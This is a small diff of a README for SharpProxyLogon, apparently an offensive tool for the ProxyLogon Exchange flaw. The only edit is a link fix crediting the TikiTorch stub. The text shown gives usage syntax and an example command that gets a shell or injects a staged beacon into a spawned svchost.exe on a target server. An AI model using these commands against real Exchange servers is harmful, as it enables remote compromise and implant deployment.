@@ -15,7 +15,7 @@ Usage Shell: SharpProxyLogon.exe <targetip> <targetemail>
 Usage x64 injection: SharpProxyLogon.exe <targetip> <targetemail> <shellcodepath.bin> <inject-target-full-path>
 ```
 
-Shellcode injection uses built-in [TikiTorch stub]("https://github.com/rasta-mouse/TikiTorch"), this will spawn, suspend and inject staged_beacon.bin into svchost.exe
+Shellcode injection uses built-in [TikiTorch stub by @Rastamouse](https://github.com/rasta-mouse/TikiTorch), this will spawn, suspend and inject staged_beacon.bin into svchost.exe
 
 ```
 SharpProxyLogon.exe 192.168.58.111:443 administrator@legitcorp.net C:\Temp\staged_beacon.bin "C:\Windows\System32\svchost.exe"
